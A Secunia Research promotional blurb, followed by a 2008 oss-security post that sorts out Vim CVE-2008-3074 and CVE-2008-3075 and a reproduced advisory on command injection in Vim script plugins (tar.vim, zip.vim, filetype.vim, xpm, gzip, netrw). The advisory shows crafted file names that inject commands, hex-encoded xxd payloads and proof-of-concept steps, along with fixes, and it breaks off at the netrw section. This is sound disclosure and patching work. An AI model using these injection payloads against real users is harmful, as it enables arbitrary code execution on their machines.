How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

Subject: Vim CVE issues cleanup (plugins tar.vim, zip.vim) - CVE-2008-3074
 and CVE-2008-3075

Hello Steve and Jan,

  got time to dive deeply into these issues and attempting to
summarize all the information about them known till today,
in order to clear specification of CVE-2008-3074 and CVE-2008-3075
to be able to reference them in our advisories.

Tar.vim plugin issues:

Original advisory:  <http://www.rdancer.org/vulnerablevim-shellescape.html>

Part 1 -- TAR Observations:
===========================

* Jan Minar says: Version  : >= 7.2a.013; < 7.2b.005; tested with 7.2b
                            The shellescape() function added by patch 7.0.111.
* Patch 7.0.111: [http://www.mail-archive.com/vim-dev@vim.org/msg02313.html](http://www.mail-archive.com/vim-dev%40vim.org/msg02313.html)

* Vulnerability (from vulnerablevim-shellescape.html)

   3. Vulnerability

   shellescape() does not escape all special items.  In particular,
   shellescape() does not escape the ``!'' character.

   4. Exploit -- Proof of Concept

  To show that this vulnerability can be exploited, we have updated our
  ``tar.vim'' exploit.   Run ``make test'' in the ``tarplugin.v2''
  directory.

* Testcases for this issue (from Vim testsuite) (self research):

  -- shellescape (from Makefile - rdancer's exploit of the Vim 7.2b shellescape vuln)
  -- tarplugin.v2 (from Makefile - rdancer's exploit of the Vim shellescape() vuln)
  -- tarplugin (from Makefile -- rdancer's exploit of the vim 7.1 tar plugin)
  -- tarplugin.updated (from Makefile - rdancer's exploit of the vim 7.1 tar plugin)

   Differences between Makefiles in particular testcases:

   tarplugin vs tarplugin.v2:

    24c22
    < TARBALL_NAME = "sploit/$(INITIAL)'|so%|retu|'$(FINAL).tar"
    ---
    > TARBALL_NAME = "sploit/$(INITIAL);eval eval \`echo 0:64617465203e2070776e6564 | xxd -r\`;: $(FINAL).tar"

    and Vim debug options added:

    40a39,42
    > # For the test target -- Non-interactive run
    > VIM_TEST_OPTIONS = ${VIM_OPTIONS} +:'exe "norm \<CR>"' +:qa
    > # For the debug target -- Add breakpoints
    > VIM_DEBUG_OPTIONS = +':breakadd func 38 tar\#Read' ${VIM_TEST_OPTIONS}
    62a65,69

    tarplugin vs tarplugin.updated:

    c24
    < TARBALL_NAME = "sploit/$(INITIAL)'|so%|retu|'$(FINAL).tar"
    ---
    > TARBALL_NAME = "sploit/$(INITIAL)%;eval eval \`echo 0:64617465203e2070776e6564 | xxd -r\`;'$(FINAL).tar"

* Your questions in  <http://www.openwall.com/lists/oss-security/2008/08/01/1> :

    Report TAR-1

    rdancer says "shellescape() does not escape all special items"
    specifically the "!" character

    - <http://www.rdancer.org/vulnerablevim-shellescape.html>

    - 7.2a.013 and other versions before 7.2b.005

    - mentions tar.vim (tarplugin)

    - test case: tarplugin.v2

  - Report TAR-2

     Tomas Hoger says affects 7.0 and 7.1:

     <http://www.openwall.com/lists/oss-security/2008/07/15/2>

  - Report TAR-3

     assignment of CVE-2008-3074 to "tarplugin"

         <http://www.openwall.com/lists/oss-security/2008/07/10/7>

         - already used by rPath in advisory

  - Report TAR-4

     rdancer tar.vim issue

           <http://www.rdancer.org/vulnerablevim.html>

  - Report TAR-5

    rdancer says tar.vim test was omitted from Makefile

        <http://www.openwall.com/lists/oss-security/2008/07/13/1>

   1) Are TAR-1, TAR-2, TAR-3, and TAR-4 all talking about the same
      issue?  If not - which ones are the same?

   2) Since tar.vim doesn't affect 6.x, it should stay SPLIT from
      CVE-2008-2712.

* Affected Vim versions: Vim 7.0, tar.vim v.10 (from Jul 24,2006) <= x < Vim 7.2, tar.vim v.23 (from Aug 08, 2008)
                         Vim 6.0 DOES NOT include tar.vim plugin.
                         (based on self testing)

Part 2 -- TAR Conclusions:
==========================

  The testcase to find out if Vim is vulnerable to the
  shellescape vulnerability is in 'shellescape'. The proof
  this issue can be exploited is in 'tarplugin.v2'. (Report TAR-1)
  Rdancer has originally claimed, this issue affects only Vim
  (>= 7.2a.013; < 7.2b.005;), But 'tarplugin.v2' testcase
  run proofs it affects also Vim 7.0 and Vim 7.1. (Report TAR-2)
  We should probably use CVE-2008-3074 when referencing to
  these issues (Report TAR-3).
  Report TAR-4 issue is covered by 'tarplugin' testcase
  (the same issue).
  Report TAR-5 - only top-most Makefile change.

Replies to your questions: 1, TAR-1, TAR-2, TAR-3 and TAR-4 are talking about the same issue.
                              The 'only' slight difference between them is the provided
                              "TARBALL_NAME" to the testcase.

                           2, This issue should be definitely split from CVE-2008-2712 -- reasons:
                              a, it does not affect Vim 6.0,
                              b, CVE-2008-2712 has no mention about tar.vim plugin
                              c, we should use already assigned CVE-2008-3074 for this
                                 issue (as it was already used in the rPath advisory).

Part 3 -- ZIP Observations:
===========================

* Original advisory: <http://www.rdancer.org/vulnerablevim.html> (Part 3.4.2.4. zip.vim)
* Testcases: zipplugin
             zipplugin.v2

  Difference between Makefiles:

    a, different name used for the zip archive

    24c24,25
    < ARCHIVE_NAME = "sploit/$(INITIAL)'|so%|retu|'$(FINAL).zip"
    ---
    > ARCHIVE_NAME = "sploit/$(INITIAL)|call system(\"eval eval \`echo 0:64617465203e3e2070776e6564 | xxd -r\`\")|$(FINAL).zip"

    b, Different "# Compile the exploit\n# The ar\n.PHONY: sploit\nsploit: exploit.vim plugin" part

* Relation between zip.vim and zipPlugin.vim (zipplugin mentioned in bullet (2) of CVE-2008-2172)

  /usr/share/vim/vim71/plugin/zipPlugin.vim "only" calls zip functions (zipBrowse, zipRead, zipWrite etc.)
  defined in /usr/share/vim/vim71/autoload/zip.vim

* Your questions in <http://www.openwall.com/lists/oss-security/2008/08/01/1> related to ZIP plugin:

  zip.vim

  - Report ZIP-1

    rdancer says "zip.vim" as well as "zipPlugin.vim"

    - <http://www.rdancer.org/vulnerablevim.html>

	- Vim 7.1.298 and 6.4

	- *part* of the advisory used CVE-2008-2712, but CVE-2008-2712
       didn't include it

  - Report ZIP-2

    Tomas Hoger suggests "still unfixed"

	   <http://www.openwall.com/lists/oss-security/2008/07/10/7>

    - CVE-2008-3075 assigned; used by rPath

	- since CVE-2008-2712 issues were fixed and zip.vim remains
      unfixed, a SPLIT from CVE-2008-2712 is reasonable

  - Report ZIP-3

    Tomas Hoger says "only 7.0 and 7.1" affected

	  <http://www.openwall.com/lists/oss-security/2008/07/15/2>

  - Report ZIP-4

    rdancer says zip "has not been fixed as of Vim 7.2a.19/zip.vim
    v19"

	  <http://www.openwall.com/lists/oss-security/2008/07/13/1>

  - Report ZIP-5

    CVE-2008-2712 bullet (2) mentions zipplugin based on same advisory
    as ZIP-1:

	<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2712>

    1) Are ZIP-1, ZIP-2, ZIP-3, and ZIP-4 all talking about the same
       issue?

    2) What differences, if any, are there in zip.vim and zipplugin.vim?

    3) Given the varying results for TAR-1 through TAR-4, should zip.vim
       be split from the tar issues?  What about zipplugin.vim?

    4) It might be reasonable to remove item (2) from CVE-2008-2712.

* Affected Vim versions: Vim 7.0, zip.vim v.11 (from Jul 24, 2006) < Vim 7.2, zip.vim v.22 (Jul 30, 2008)
                         Vim 6.0+ DOES NOT include zip.vim plugin.

Part 4 -- ZIP Conclusions:
==========================

  zipPlugin.vim was mentioned in CVE-2008-2712, but zip.vim omitted. zipPlugin.vim
  "only" calls functions (zipWrite, zipRead, zipBrowse) provided by the zip.vim
  plugin. The text of CVE-2008-2712 should be modified -- the bullet (2) -- mention
  about zipplugin should be removed from it, as the issue was fixed only later
  in zip.vim plugin (Report ZIP-1).

  CVE-2008-3075 was used by rPath for this issue (Report ZIP-2).

  According to zipplugin testcases (zipplugin, zipplugin.v2) also Vim 7.0, and
  Vim 7.1 affected by this issue (Report ZIP-3).

  zip.vim v.19 is still vulnerable to this issue. Fixed in version zip.vim v.22
  (see Affected Vim versions). (Report ZIP-4).

  Bullet (2) -- mention about zipplugin should be removed from CVE-2008-2712.
  <http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2712> (Report ZIP-5).

* Replies to your questions:

    1) Are ZIP-1, ZIP-2, ZIP-3, and ZIP-4 all talking about the same issue?

      Reply: Yes, these all are clones of the same issue.

   2) What differences, if any, are there in zip.vim and zipplugin.vim?

      Reply: zip.vim defines the functions (zipBrowse, zipRead, zipWrite),
             zipPlugin.vim "only calls" them.

   3) Given the varying results for TAR-1 through TAR-4, should zip.vim
      be split from the tar issues?  What about zipplugin.vim?

      Reply: The issue in its nature is the same as by TAR plugin
            (inproper sanitization of the '!' character as in the tar
             archives, but projected to zip archives)

Part 5 -- Needed actions:
==========================

  1, Remove bullet (2) -- mention about zipplugin from CVE-2008-2712.
  2,

     a, either merge TAR, ZIP Vim issues under CVE-2008-3074 and reject CVE-2008-3075.
        This one is the PREFERRED SOLUTION.

     Proposed description of CVE-2008-3074:

     "The shellescape() function in Vim 7.0 through 7.2 does not properly escape
      all special items (in particular the '!' character). This results in
      untrusted data being insufficiently sanitized, possibly leading to
      arbitrary code execution as demonstrated on VIM TAR plugin
      (tar.vim) from v.10 through v.22 or VIM ZIP plugin (zip.vim) from version v.11
      through v.21."

1. Summary
Product : Vim -- Vi IMproved
Version : Tested with 7.1.314 and 6.4
Impact : Arbitrary code execution
Wherefrom: Local and remote
Original : http://www.rdancer.org/vulnerablevim.html
Improper quoting in some parts of Vim written in the Vim Script can lead to
arbitrary code execution upon opening a crafted file.
2. Overview
``Vim is an almost compatible version of the UNIX editor Vi. Many new features
have been added: multi-level undo, syntax highlighting, command line history,
on-line help, spell checking, filename completion, block operations, etc.''
-- VIM 7.1 README.txt
Parts of Vim are written in the Vim script language. A feature of this
language widely used in the Vim code is the ``execute'' command, an equivalent
of ``eval'' in some other languages. Throughout Vim, arguments passed to
``execute'' are not sanitized properly. This can lead to arbitrary code
execution. We will show several exploits which execute arbitrary code upon
opening a crafted file with the ex(1), vim(1), or view(1) commands. Only in
few cases will we explore the possibility of remote exploitation. We will
present fixes/workarounds to some of the vulnerabilities.
The archive with code that is a part of this advisory can be found at
``http://www.rdancer.org/vulnerablevim.tar.bz2''.
3. Details
3.0. Vim version
In this advisory, we analyse Vim version 7.1.298.
3.1. Vim Script in Vim
``The Vim script language is used for the startup vimrc file, syntax files, and
many other things.''
-- Vim User Manual, Chapter 41 (usr\_41.txt)
How much is Vim Script used throughout Vim?
$ find /usr/local/share/vim -type f -name \*.vim | wc -l
1037
$ find /usr/local/share/vim -type f -name \*.vim -exec cat {} ;
| wc 2>/dev/null
149617 710299 6502709
3.2. The ``execute'' command
:exe[cute] {expr1} .. Executes the string that results from the evaluation
of {expr1} as an Ex command.
-- Vim Reference Manual (eval.txt)
``execute'' is similar e.g. to the ``eval'' command of the POSIX shell. As Vim
Script doesn't allow variables as arguments to commands, only literals,
``execute'' is very popular:
let a = "vim"
execute "setfiletype" a " Alternative is cumbersome
let b = "/path/to/foo"
execute "split" b " No alternative
Now whereas the setfiletype line can be written as:
if !did\_filetype()
let &l:filetype = a
endif
There is no alternative for the split command -- execute must be used. Which
is a pity, because we might not even necessarily have control over the file
name[1] . Symlinks or shell redirection might be used as a workaround.
3.3. Quoting in Vim Script
There is no way to quote Ex command arguments transparently. When sanitizing
an argument for shell's ``eval'' command, one can simply prepend all single
quotes with a backslash, prepend and append a single quote, and that's it. In
Vim, this algorithm has been recently introduced in the form of the
shellescape() function[2]:
$ ex
Entering Ex mode. Type "visual" to go to Normal mode.
:let fmt = "%l o'clock"
:let fmt\_escape = shellescape (fmt)
:echo fmt\_escape
'%l o'''clock'
:echo system ("date +" . fmt\_escape)
6 o'clock
Sanitizing an argument of an Ex command in a generic way is not going to be
that easy.
3.3.1. Three Character Classes
Ex commands don't accept strings for arguments, only bare-words. In other
words, there is just one level of quoting. It is possible to quote individual
characters by prepending a backslash. As we can learn in the Vim Reference
Manual (``cmdline.txt'') we can divide the characters in three classes --
characters that are treated specially :
(1) \*unless\* preceded by a backslash
(2) \*when\* preceded by a backslash
(3) when preceded by a \*quoted\* backslash
Example:
Command File written
------------------------------
:write % Current file name
:write % %
:write \% %
So, now we have to write a piece of code that knows which class the characters
belong to, and quote them accordingly, right? Not really.
There is a plethora of characters treated in a special way by Vim commands.
Treatment varies with context. We haven't found a comprehensive description
which characters are treated specially by which commands, in which way.
3.4. Vulnerabilities
3.4.1. Statistics
How many Vim Scripts use ``execute''?:
$ find /usr/local/share/vim -type f -name \*.vim -exec grep -l
'<exe(c(u(te?)?)?)?>' {} ; | wc -l
159
How many ``execute'' statements are there?:
$ find /usr/local/share/vim -type f -name \*.vim -exec grep -h
'<exe(c(u(te?)?)?)?>' {} ; | wc -l
991
Without comments:
$ find /usr/local/share/vim -type f -name \*.vim -exec grep -h
'<exe(c(u(te?)?)?)?>' {} ; | grep -v '^[[:blank:]]\*"' |
wc -l
901
3.4.2. Exploits
All the exploits are created using the accompanying Makefiles in the respective
subdirectories. When open in vim (or ex, view), the exploits create a file
called ``pwned'' in the current directory. To create all the exploits in a
certain subdirectory, run ``make all'' in that subdirectory. See the respective
Makefile sources for details.
It is also possible to use the Makefile in the root directory of this archive.
To test all the exploits, run ``make test''. On an unpatched system, this
will print a lot of output, and then show a nice table at the end:
$ make test
<snip>
-------------------------------------------
-------- Test results below ---------------
-------------------------------------------
filetype.vim
strong : VULNERABLE
weak : VULNERABLE
zipplugin : VULNERABLE
xpm.vim
xpm : VULNERABLE
xpm2 : VULNERABLE
remote : VULNERABLE
gzip\_vim : VULNERABLE
netrw : VULNERABLE
Let's approach each vulnerability one by one. Each vulnerability section can
be read independently of the others, and some of the information is therefore
repeated.
3.4.2.1. filetype.vim (the ``weak'' exploit)
Because this vulnerability requires the exploit file name to contain the
payload, we have called this the ``weak'' exploit.
3.4.2.1.1. Vulnerability
Exploits the execute statements at filetype.vim lines 20, 25 or 31:
19 au BufNewFile,BufRead
?+.orig,?+.bak,?+.old,?+.new,?+.rpmsave,?+.rpmnew
\*20 exe "doau filetypedetect BufRead " . expand("<afile>:r")
21 au BufNewFile,BufRead \*~
22 let s:name = expand("<afile>") |
23 let s:short = substitute(s:name, '~$', '', '') |
24 if s:name != s:short && s:short != "" |
\*25 exe "doau filetypedetect BufRead " . s:short |
26 endif |
27 unlet s:name |
28 unlet s:short
29 au BufNewFile,BufRead ?+.in
30 if expand("<afile>:t") != "configure.in" |
\*31 exe "doau filetypedetect BufRead " . expand("<afile>:r") |
32 endif
A (modified) file name is used as an argument to the ``execute'' command
without proper quoting. Crafted file name can be used to execute arbitrary Vim
Shell commands. Content of the file is not important.
3.4.2.1.2. Exploit
$ cd filetype.vim
$ EXPLOIT\_FLAVOUR=weak make -s clean sploit
$ readlink exploit
sploit/README-|so%~
$ ls pwned
ls: cannot access pwned: No such file or directory
$ vim "`readlink exploit`"
[ Observe the file looks quite normal ]
$ ls pwned
pwned
3.4.2.1.3. Fix
We attempted a fix along the lines of:
let badchars = "" |%#nt!<"
[...]
exe "doau filetypedetect BufRead " . escape(expand("<afile>:r"), badchars)
We were not confident we have identified all the metacharacters that need
quoting, or at least all the characters that must not have been quoted (so we
could quote all the rest).
3.4.2.1.3. Workaround
Comment out affected statements in ``filetype.vim''.
-- autocommand triggered by filename matching pattern (i.e. having the
right extension)
-- possible to create valid syntax
-- menu.lst won't work in usual locations
3.4.2.2. filetype.vim (the ``strong'' exploit)
Because this vulnerability works with an innocuously looking filename,
we have called this the ``strong'' exploit.
3.4.2.2.1. Vulnerability
Exploits absent sanitization on line 190, followed by the execute statements at
filetype.vim lines 181 or 1267:
The code looks in the first five lines for a statement of the form
``asmsyntax=FOO'', where FOO can contain any characters except Tab and Space.
FOO is then executed, without any sanitization.
187 let head = " ".getline(1)." ".getline(2)." ".getline(3)." ".getline(4).
188 " ".getline(5)." "
189 if head =~ 'sasmsyntax=S+s'
\*190 let b:asmsyntax = substitute(head,
'.\*sasmsyntax=(S+)s.\*','1', "")
[... logical flow of the code then jumps to line 181 ...]
\*181 exe "setf " . b:asmsyntax
[... or line 1267 ...]
\*1267 exe "setf " . b:asmsyntax
In ``filetype.vim'', there are twelve other (non-exploitable) occurrences of
the ``exe "setf " . some\_variable'' idiom:
$ grep '"setf ' filetype.vim
exe "setf " . g:filetype\_asa |
exe "setf " . g:filetype\_asp |
exe "setf " . b:asmsyntax
exe "setf " . a:alt
exe "setf " . g:filetype\_prg |
exe "setf " . g:filetype\_m
exe "setf " . g:filetype\_pl
exe "setf " . g:filetype\_inc
exe "setf " . b:asmsyntax
exe "setf " . g:filetype\_w
exe "setf " . g:filetype\_i
exe "setf " . g:filetype\_p
exe "setf " . a:name
exe "setf " . g:filetype\_sql
3.4.2.2.2. Exploit
$ cd filetype.vim
$ EXPLOIT\_FLAVOUR=strong make -s clean sploit
$ readlink exploit
sploit/menu.lst
$ ls pwned
ls: cannot access pwned: No such file or directory
$ vim "`readlink exploit`"
[ Observe the file is an ordinary menu.lst -- or is it ]
$ ls pwned
pwned
The exploit is a valid grub menu.lst, and also a valid Vim Script file. When
open in Vim (view, ex), the payload is hidden. The exploit will not work when
placed in ``/boot/grub''. This is because ``filetype.vim'' treats
``/boot/grub/menu.lst'' specially (``filetype.vim'' line 154).
3.4.2.2.3. Remote exploit
We had to alter the payload, because (1) we can't source the remote file
directly, and (2) the payload is executed twice. The payload is written to a
temporary file, which is then sourced.
$ cd filetype.vim
$ make -s clean sploit-remote http-server
$ fuser -n tcp 31337/tcp
31337/tcp: 20190
$ ls pwned
ls: cannot access pwned: No such file or directory
$ vim http://localhost:31337/"`readlink exploit`"
[ Edit, enjoy, quit ]
$ ls pwned
pwned
``make test-remote'' and ``make demo-remote'' automate the process.
3.4.2.2.4. Fix
Apply the following patch:
--- /usr/local/share/vim/vim71/filetype.vim 2007-07-20 19:32:34.000000000 +0100
+++ filetype.vim 2007-08-05 23:01:49.000000000 +0100
&#64;&#64; -178,16 +178,19 &#64;&#64;
endif
endif
- exe "setf " . b:asmsyntax
+ if !did\_filetype()
+ let &l:filetype = b:asmsyntax
+ endif
endfunc
func! s:FTasmsyntax()
+ let l:badchars = "/\\*?[|<> t"
" see if file contains any asmsyntax=foo overrides. If so, change
" b:asmsyntax appropriately
let head = " ".getline(1)." ".getline(2)." ".getline(3)." ".getline(4).
" ".getline(5)." "
- if head =~ 'sasmsyntax=S+s'
- let b:asmsyntax = substitute(head, '.\*sasmsyntax=(S+)s.\*','1', "")
+ if head =~ 'sasmsyntax=[^'.l:badchars.']+s'
+ let b:asmsyntax = substitute(head,
'.\*sasmsyntax=([^'.l:badchars.']+)s.\*','1', "")
elseif ((head =~? '.title') || (head =~? '.ident') || (head =~?
'.macro') || (head =~? '.subtitle') || (head =~? '.library'))
let b:asmsyntax = "vmasm"
endif
&#64;&#64; -1264,7 +1267,9 &#64;&#64;
else
call s:FTasmsyntax()
if exists("b:asmsyntax")
- exe "setf " . b:asmsyntax
+ if !did\_filetype()
+ let &l:filetype = b:asmsyntax
+ endif
else
setf pov
endif
The if-clause is equivalent to ``setfiletype b:asmsyntax'' (if that were valid
syntax) -- cf. ``:help setfiletype''.
The sanitization added is based on Vim Reference Manual options.txt, which says
about the 'syntax' option: ``Only normal file name characters can be used,
"/\*?[|<>" are illegal.'' It is possible that there are systems on which a
stricter check is required. A check against a fixed list of possible values
would be nice, but what if there are user-defined syntax files? -- Could we get
a list of valid values for an option somehow (portably)?
3.4.2.3. tar.vim
``When one edits a \*.tar file, this plugin will handle displaying a
contents page. Select a file to edit by moving the cursor atop
the desired file, then hit the <return> key. After editing, one may
also write to the file. Currently, one may not make a new file in
tar archives via the plugin.''
-- Vim online help (``pi\_tar.txt'')
3.4.2.3.1. Vulnerability
File name is used in ``execute'' and ``system()'' commands without proper
sanitization. Opening a tarball with a crafted file name can lead to arbitrary
code execution. Following are some of the vulnerable statements of
``tar.vim''. This list is probably incomplete:
99 exe "$put ='".'"'." Browsing tarfile ".a:tarfile."'"
107 let tarfile=substitute(system("cygpath -u ".tarfile),'n$','','e')
112 exe "silent r! gzip -d -c ".g:tar\_shq.tarfile.g:tar\_shq."|
".g:tar\_cmd." -".g:tar\_browseoptions." - "
115 exe "silent r! bzip2 -d -c ".g:tar\_shq.tarfile.g:tar\_shq."|
".g:tar\_cmd." -".g:tar\_browseoptions." - "
118 exe "silent r! ".g:tar\_cmd." -".g:tar\_browseoptions."
".g:tar\_shq.tarfile.g:tar\_shq
134 exe "r ".a:tarfile
169 let tarfile=substitute(system("cygpath -u ".tarfile),'n$','','e')
192 let tarfile=substitute(system("cygpath -u ".tarfile),'n$','','e')
199 exe "silent r! gzip -d -c ".g:tar\_shq.tarfile.g:tar\_shq."|
".g:tar\_cmd." -".g:tar\_readoptions." - '".fname."'"
202 exe "silent r! bzip2 -d -c ".g:tar\_shq.tarfile.g:tar\_shq."|
".g:tar\_cmd." -".g:tar\_readoptions." - '".fname."'"
205 exe "silent r! ".g:tar\_cmd." -".g:tar\_readoptions."
".g:tar\_shq.tarfile.g:tar\_shq." ".g:tar\_shq.fname.g:tar\_shq
208 exe "file tarfile:".fname
278 call system("gzip -d ".tarfile)
282 call system("gzip -d ".tarfile)
287 call system("bzip2 -d ".tarfile)
303 let dirpath = substitute(system("cygpath ".dirpath),'n','','e')
312 exe "w! ".fname
314 let tarfile = substitute(system("cygpath ".tarfile),'n','','e')
319 call system("tar --delete -f '".tarfile."' '".fname."'")
335 call system(compress)
351 exe "e! ".tarfile
All the arguments in these statements are derived from the tarball file name,
with insufficient or absent sanitization.
3.4.2.3.2. Exploit
We exploit the statement on the line 99, with a crafted file name. The tarball
gets sourced. The tarball is also a valid Vim Script file. Its contents is
arbitrary, as long as the exploit payload is the first archive member.
$ cd tarplugin
$ make -s clean sploit
$ readlink exploit
sploit/foo'|so%|retu|'bar.tar
$ file -L exploit
sploit/foo'|so%|retu|'bar.tar: POSIX tar archive
$ ls pwned
ls: cannot access pwned: No such file or directory
$ vim "`readlink exploit`"
[ Observe the file works like an ordinary tarball would ]
$ ls pwned
pwned
For your convenience, running running ``make demo'' and ``make test'' in the
tarplugin directory will do all the hard work in an interactive, and
non-interactive way, respectively, and tell you whether the exploit has worked.
3.4.2.3.3. Fix
The exploit includes a modified ``tar.vim'' and ``tarPlugin.vim'', fixed as
much as was needed for the exploit to work.
3.4.2.4. zip.vim
``When one edits a \*.zip file, this plugin will handle displaying a
contents page. Select a file to edit by moving the cursor atop
the desired file, then hit the <return> key. After editing, one may
also write to the file. Currently, one may not make a new file in
zip archives via the plugin.''
-- Vim online help (``pi\_zip.txt'')
``tar.vim'' and ``zip.vim'' share code and vulnerabilities, and our exploit
works in a similar manner. This exploit is not full-featured -- as we've shown
with ``tar.vim'', this wouldn't be difficult to achieve.
3.4.2.4.1. Vulnerability
As with ``tar.vim'', there are many execute statements using an insufficiently
quoted file name as an argument. We exploit the same statement as with
``tar.vim'' (line 93):
93 exe "$put ='".'"'." Browsing zipfile ".a:zipfile."'"
3.4.2.4.2. Exploit
Our exploit is not feature-full -- we can open the file and see the contents
listing, but an attempt to open a member, etc., will fail with an error.
Completing the exploit would be just a matter of adapting from our ``tar.vim''
exploit.
$ cd zipplugin
$ make -s clean sploit
$ readlink exploit
sploit/foo'|so%|retu|'bar.zip
$ file -L exploit
sploit/foo'|so%|retu|'bar.zip: Zip archive data, at least v1.0 to extract
$ ls pwned
ls: cannot access pwned: No such file or directory
$ vim "`readlink exploit`"
Error detected while processing
/home/rdancer/vuln/vim71/zipplugin/sploit/foo'|so%|retu|'bar.zip:
line 1:
E492: Not an editor command: PK^C^D
[ Observe the file works like an ordinary tarball would ]
$ ls pwned
pwned
The error is caused by the zip file magic number. It doesn't stay on the
screen for too long though. We could get rid of the error by replacing the
very first character of the file (the capital P) with a double quote ("), at
the cost of creating a non-valid zip file. Set the environment variable
EXPLOIT\_ZIP\_INVALID to ``invalid'' while running ``make sploit'':
$ EXPLOIT\_ZIP\_INVALID=invalid make sploit
unzip(1) doesn't have a problem working with such file, and neither does Vim.
For your convenience, running ``make demo'' and ``make test'' in the zipplugin
directory will do all the hard work in an interactive, and non-interactive way,
respectively, and tell you whether the exploit has worked.
3.4.2.4.3. Fix
The exploit includes a modified ``zip.vim'' and ``zipPlugin.vim'', fixed as
much as was needed for the exploit to work.
3.4.2.5. xpm.vim and xpm2.vim
``xpm.vim'' and ``xmp2.vim'' provide syntax highlighting for X pixmaps. The
syntax file is loaded for filenames matching \*.pm, \*.xpm and \*.xpm2 (see
``filetype.vim'' for details). The vulnerable code is executed when Vim runs
in graphic mode (gvim(1), ``vim -g'').
3.4.2.5.1. Vulnerability
We exploit the insufficient sanitization and subsequent execution of a string
taken from the file contents:
xpm.vim:32 let s = matchstr(getline(i), '".{-1,}"')
xpm.vim:[...]
xpm.vim:43 exe 'syn match xpmValues /'.s.'/'
xmp2.vim:41 let s = getline(i)
xmp2.vim:42 if match(s,"!.\*$") != -1
xmp2.vim:43 let s = matchstr(s, "^[^!]\*")
xmp2.vim:[...]
xmp2.vim:55 exe 'syn match xpm2Values /'.s.'/'
This might be or might not be the only such vulnerability within ``xpm.vim''
and ``xpm2.vim''.
3.4.2.5.2. Exploit
Note that Vim must be run in graphic mode for the exploit to work, as the
vulnerable code branch is not run otherwise. The exploit for ``xpm.vim'' is a
valid X pixmap. The exploit for `xpm2.vim'' is not.
$ cd xpm.vim
$ make -s clean sploit
$ readlink exploit
sploit/exploit.xpm
$ file -L exploit
exploit: X pixmap image text
$ ls pwned
ls: cannot access pwned: No such file or directory
$ vim -g "`readlink exploit`"
[ Edit, enjoy, quit ]
$ ls pwned
pwned
For your convenience, running ``make demo'' and ``make test'' in the xpm.vim
directory will do all the hard work in an interactive, and non-interactive way,
respectively, and tell you whether the exploit has worked.
For the ``xpm2.vim'' exploit, set the ``EXPLOIT\_FLAVOUR'' environment
variable to ``xpm2'' when running ``make sploit'':
$ EXPLOIT\_FLAVOUR=xpm2 make -s clean sploit
You may also use ``make all'' to make all the extensions.
3.4.2.5.3. Remote exploit
In order to exploit remotely, we have had to change our exploitation technique.
``source %'' doesn't work, as it's apparently not possible to source a http://
file from within the ``xpm.vim'' script. Without investigating further, we
altered the ``xpm.vim'' exploit. Adapting the ``xpm2.vim'' exploit and the
other exploits probably is possible.
$ cd xpm.vim
$ make -s clean sploit http-server
$ fuser -n tcp 31337/tcp
31337/tcp: 20190
$ ls pwned
ls: cannot access pwned: No such file or directory
$ vim -g http://localhost:31337/"`readlink exploit`"
[ Edit, enjoy, quit ]
$ ls pwned
pwned
For your convenience, running ``make demo-remote'' and ``make test-remote'' in
the xpm.vim directory will do all the hard work in an interactive, and
non-interactive way, respectively, and tell you whether the exploit has worked.
3.4.2.6. gzip.vim
``The plugin installs autocommands to intercept reading and writing of files
with these extensions: [...] \*.Z [...] \*.gz [...] \*.bz2''
-- Vim Reference Manual (pi\_gzip.txt)
3.4.2.6.1. Vulnerability
``autoload/gzip.vim'' lines 128 and 130 use modified file name in an argument
to ``execute'' without proper sanitization or quoting:
127 if &verbose >= 8
\*128 execute "doau BufReadPost " . expand("%:r")
129 else
\*130 execute "silent! doau BufReadPost " . expand("%:r")
131 endif
3.4.2.6.2. Exploit
The contents of the file is arbitrary. The exploit uses the archive filename,
and the original filename stored within the archive (we should use the comment
field ideally). The exploit is a valid gzip file, and a Vim Script containing
non-fatal errors. We use the ``silent!'' command in the file name to suppress
the error messages.
$ cd gzip\_vim
$ make -s clean sploit
$ readlink exploit
sploit/foo|sil!so%"bar.gz
$ file -L exploit
exploit: gzip compressed data, was "", from Unix, last modified: Fri
Aug 10 01:49:28 2007
$ ls pwned
ls: cannot access pwned: No such file or directory
$ vim "`readlink exploit`"
[ The file contents really can be anything ]
$ ls pwned
pwned
For your convenience, running ``make demo'' and ``make test'' in the gzip\_vim
directory will do all the hard work in an interactive, and non-interactive way,
respectively, and tell you whether the exploit has worked.
3.4.2.7. Netrw
``Netrw makes reading, writing, and browsing over a network connection easy!
[...] Netrw supports "transparent" editing of files on other machines using
urls [...]''
-- Netrw Reference Manual (pi\_netrw.txt)
3.4.2.7.1. Vulnerability
Opening file with a crafted name from the Netrw directory listing leads to
arbitrary code execution.
Netrw (.../runtime/autoload/netrw.vim) uses unsound constructs in many places
-- see the source in We exploit the statement on line 2202. The ``dirname''
variable contains the name of the file to be opened, while
``s:netrw\_cd\_escape'' is set earlier on line 308.:
308 let s:netrw\_cd\_escape="[]#\*$%'" ?`!&();<>\"
[...]
\*2202 exe "e! ".escape(dirname,s:netrw\_cd\_escape)
The escape() fails in its apparent purpose of sanitizing ``dirname'', because
``s:netrw\_cd\_escape'' is incomplete.
3.4.2.7.2. Exploit
$ cd netrw
